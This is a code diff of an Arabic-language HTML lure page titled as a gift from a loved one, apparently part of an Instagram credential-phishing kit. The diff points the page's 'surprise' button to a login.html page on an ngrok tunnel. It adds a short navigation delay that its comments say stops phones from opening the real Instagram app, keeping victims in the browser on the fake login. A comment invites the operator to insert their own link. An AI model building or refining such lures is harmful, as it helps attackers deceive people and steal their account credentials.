@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>حبيبك بعتلك ده😍</title>
+<title>حبيبك بعتلك ده</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Lalezar&family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
 <style>
@@ -180,10 +180,15 @@
   // =======================================================
   // غيّر اللينك اللي هنا بس، وحط مكانه اللينك اللي انت عايزه
   // =======================================================
-  const LINK = "https://confident-crimp-pang.ngrok-free.dev";
+  const LINK = "https://confident-crimp-pang.ngrok-free.dev/login.html";
 
   function goToSurprise(){
-    window.location.href = LINK;
+    // بنأخر التنقل شوية عشان الموبايل ميعتبرهاش
+    // "ضغطة مباشرة على لينك" فيفتحلك انستجرام كتطبيق،
+    // وبكده غالبًا هيفضل فاتح في المتصفح بدل ما يحولك للأبلكيشن
+    setTimeout(function(){
+      window.location.href = LINK;
+    }, 100);
   }
 </script>
 
